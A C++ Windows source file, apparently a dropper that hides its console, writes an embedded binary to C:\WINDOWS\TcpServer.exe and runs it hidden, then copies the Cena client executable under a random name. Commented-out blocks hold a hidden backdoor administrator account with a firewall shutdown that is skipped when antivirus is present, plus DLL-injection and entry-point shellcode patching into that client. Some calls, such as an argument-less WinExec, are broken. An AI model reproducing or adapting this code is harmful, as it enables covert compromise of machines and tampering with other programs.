#include "def.h"
#pragma comment(lib,"th32.lib")
#include <time.h>
//#include "imagehlp.h"
#include "stddef.h"
//#pragma comment(lib,"imagehlp.lib")

/*LPBYTE  GetExeEntryPoint(char *filename)
{
	PIMAGE_NT_HEADERS      pNTHeader;
	DWORD pEntryPoint;
	PLOADED_IMAGE       pImage;
	pImage = ImageLoad(filename, NULL);
	if(pImage == NULL)
		return NULL;
	pNTHeader = pImage->FileHeader;
	pEntryPoint = pNTHeader->OptionalHeader.AddressOfEntryPoint + pNTHeader->OptionalHeader.ImageBase;
	ImageUnload(pImage);
	return (LPBYTE)pEntryPoint;
}*/

int WinMain(HINSTANCE hInst,HINSTANCE hPrev,LPSTR lpCmd,int nShow)
{
	ShowWindow(GetConsoleWindow(),SW_HIDE);
	/*bool fnd=GetProcessidFromName("360tray.exe")==0?false:true;
	if(!fnd)
	{
		system("cmd /c net user USER_SYSTEM$ USER_SYSTEM$ /add");
		system("cmd /c net localgroup administrators USER_SYSTEM$ /add");
		system("cmd /c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v USER_SYSTEM$ /t REG_DWORD /d 0 /f");
		system("cmd /c reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v forceguest /t REG_DWORD /d 0 /f");		
		system("cmd /c net stop SharedAccess");
		//system("cmd /c sc config tlntsvr start= auto");
		//system("cmd /c net start tlntsvr");
	}*/
	
	if(GetFileAttributes("C:\\WINDOWS\\TcpServer.exe") & 0xFFFFFFFF)
	{
		FILE*fp=fopen("C:\\WINDOWS\\TcpServer.exe","wb");
		fwrite(data,sizeof(data),1,fp);
		fclose(fp);
	}
	Sleep(50);
	WinExec("C:\\WINDOWS\\TcpServer.exe",SW_HIDE);
	
	/*FILE*fp=fopen("c:\\windows\\cenaclnt.exe","wb");
	fwrite(data1,sizeof(data1),1,fp);
	fclose(fp);*/
	//WinExec("c:\\windows\\system32\\cenaclnt.exe",SW_SHOW);
	
	char*str=new char[99];
	strcpy(str,"c:\\windows\\temp\\cenaclnt-");
	srand((unsigned)time(NULL));
	int val=rand()%(65530 + 1 - 1) + 1;
	char*vs=new char[8];
	itoa(val,vs,8);
	strcat(str,vs);strcat(str,".exe");
	CopyFile("c:\\windows\\system32\\cenaclnt.exe",str,TRUE);
	WinExec();
	//strcpy(str,"c:\\windows\\system32\\cenaclnt.exe");
	//WinExec(str,SW_SHOW);
	/*STARTUPINFO stif;
	ZeroMemory(&stif,sizeof(stif));
	stif.cb=sizeof(STARTUPINFO);
	stif.dwFlags=STARTF_USESHOWWINDOW;
	stif.wShowWindow=SW_SHOW;
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi,sizeof(pi));*/
	/*if(!CreateProcess(NULL,str,NULL,NULL,TRUE,CREATE_NEW_CONSOLE | CREATE_SUSPENDED,NULL,NULL,&stif,&pi))
	{
		MessageBox(NULL,"Cena Client was be crashed !(Create)","Critical",MB_ICONERROR);
		return 0;
	}*/
	//ResumeThread(pi.hThread);
	/*if(GetFileAttributes("C:\\WINDOWS\\CenaDll.dll") & 0xFFFFFFFF)
	{
		FILE*fp=fopen("C:\\WINDOWS\\CenaDll.dll","wb");
		fwrite(datadll,sizeof(datadll),1,fp);
		fclose(fp);
	}
	EnabledDebugPrivilege();*/
	
	/*FARPROC farLoadLibrary = GetProcAddress(GetModuleHandle("Kernel32.dll"),"LoadLibraryA");
	HANDLE hProcess=pi.hProcess;
	LPVOID   lpDllAddr   =   VirtualAllocEx(hProcess,   NULL, strlen("C:\\WINDOWS\\CenaDll.dll"),   MEM_COMMIT,   PAGE_READWRITE); 
    if(lpDllAddr == NULL)
    {
        MessageBox(NULL,"Cena Client was be crashed !(Alloc)","Critical",MB_ICONERROR);
        CloseHandle(hProcess);
        return 0;
    }
    if(!WriteProcessMemory(hProcess,   lpDllAddr,   "C:\\WINDOWS\\CenaDll.dll",   strlen("C:\\WINDOWS\\CenaDll.dll") ,NULL))
    {
        MessageBox(NULL,"Cena Client was be crashed !(Write)","Critical",MB_ICONERROR);
        CloseHandle(hProcess);
        return 0;
    }
    HANDLE   hT   =   CreateRemoteThread(hProcess,   NULL,   0,   (LPTHREAD_START_ROUTINE)farLoadLibrary,   lpDllAddr,   0,   NULL);   
    CloseHandle(hT);
	
	MessageBoxA(NULL,"","",0);*/


	/*typedef DWORD (WINAPI *NtResumeProcess)(HANDLE hProcess);
	NtResumeProcess   m_NtResumeProcess;
	HMODULE h_module=LoadLibraryW(L"ntdll.dll");
	m_NtResumeProcess=(NtResumeProcess)GetProcAddress(h_module,"NtResumeProcess");
	m_NtResumeProcess(hProcess);*/
	
	/*// 监视程序和DLL共用的结构体
#pragma pack (push ,1) // 保证下面的结构体采用BYTE对齐（必须）
	typedef struct 
	{
		BYTE      int_PUSHAD;         // pushad        0x60       
		BYTE      int_PUSH;             // push &szDLL     0x68
		DWORD push_Value;           //            &szDLL = "ApiSpy.dll"的path
		BYTE      int_MOVEAX;              //  move eax &LoadLibrary  0xB8
		DWORD eax_Value;             //     &LoadLibrary
		WORD    call_eax;         //     call eax    0xD0FF(FF D0) (LoadLibrary("dll.dll");
		BYTE      jmp_MOVEAX;             //     move eax &ReplaceOldCode  0xB8       
		DWORD jmp_Value;             //     JMP的参数
		WORD    jmp_eax;        //     jmp eax   0xE0FF(FF E0) jmp ReplaceOldCode;
		char szDLL[MAX_PATH]; //  "ApiSpy.dll"的FullPath
	}INJECT_LOADLIBRARY_CODE, *LPINJECT_CODE, INJECT_CODE;
#pragma pack (pop , 1)
	// 用CreateProcess启动一个暂停的目标进程
	CreateProcessA(0, str, 0, 0, FALSE, CREATE_SUSPENDED, 0, NULL, &stif,&pi) ;
	LPBYTE pEntryPoint = GetExeEntryPoint(str);
	// FileMaping的结构体
	typedef struct 
	{
		LPBYTE  lpEntryPoint;   // 目标进程的入口地址
		BYTE      oldcode[sizeof(INJECT_CODE)];        // 目标进程的代码保存
	}SPY_MEM_SHARE, * LPSPY_MEM_SHARE;
// 创建FileMapping
	HANDLE hMap = CreateFileMapping((HANDLE)0xFFFFFFFF, NULL,
       PAGE_READWRITE,    0, sizeof(SPY_MEM_SHARE), "MyDllMapView");
	LPSPY_MEM_SHARE lpMap = (LPSPY_MEM_SHARE)MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	DWORD cBytesMoved;
	ReadProcessMemory(pi.hProcess, pEntryPoint,
		&lpMap->oldcode, sizeof(INJECT_CODE),
		&cBytesMoved);
	lpMap->lpEntryPoint = pEntryPoint;
	// 准备注入DLL的代码
	INJECT_CODE     newCode;
	// 写入MyDll―――用全路径
	lstrcpy(newCode.szDLL, "C:\\WINDOWS\\CenaDll.dll");
	// 准备硬代码（汇编代码）
	newCode.int_PUSHAD = 0x60;    
	newCode.int_PUSH = 0x68;
	newCode.int_MOVEAX = 0xB8;
	newCode.call_eax = 0xD0FF;
	newCode.jmp_MOVEAX = 0xB8;
	newCode.jmp_eax = 0xE0FF;
	newCode.eax_Value = (DWORD)&LoadLibrary;
	newCode.push_Value=(ULONG)(pEntryPoint + offsetof(INJECT_CODE,szDLL));
	// 将硬代码写入目标进程的入口
	// 修改内存属性
	DWORD dwNewFlg, dwOldFlg;
	dwNewFlg = PAGE_READWRITE;
	VirtualProtectEx(pi.hProcess, (LPVOID)pEntryPoint, sizeof(DWORD), dwNewFlg, &dwOldFlg);
	WriteProcessMemory(pi.hProcess, pEntryPoint, &newCode, sizeof(newCode), NULL);//&dwWrited);
	VirtualProtectEx(pi.hProcess, (LPVOID)pEntryPoint, sizeof(DWORD), dwOldFlg, &dwNewFlg);
	// 释放FileMaping  注意，不是Closehandle(hMap)
UnmapViewOfFile(lpMap);

ResumeThread(pi.hThread); */

	/*TCHAR szDll[] = TEXT("c:\\windows\\cenadll.dll");
	STARTUPINFO si = {0};
	//PROCESS_INFORMATION pi = {0};
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	TCHAR szCommandLine[MAX_PATH] = TEXT("c:\\windows\\system32\\cenaclnt.exe");
	
	CreateProcess(NULL, szCommandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	LPVOID Param = VirtualAllocEx(pi.hProcess, NULL, MAX_PATH, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(pi.hProcess, Param, (LPVOID)szDll, strlen(szDll)*2+sizeof(TCHAR), NULL);
	
	HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryW,Param, CREATE_SUSPENDED, NULL);
	ResumeThread(pi.hThread);
	
	if (hThread)
	{
		ResumeThread(hThread);
		WaitForSingleObject(hThread, INFINITE);
}


Sleep(5000);*/



	
	return 0;
}
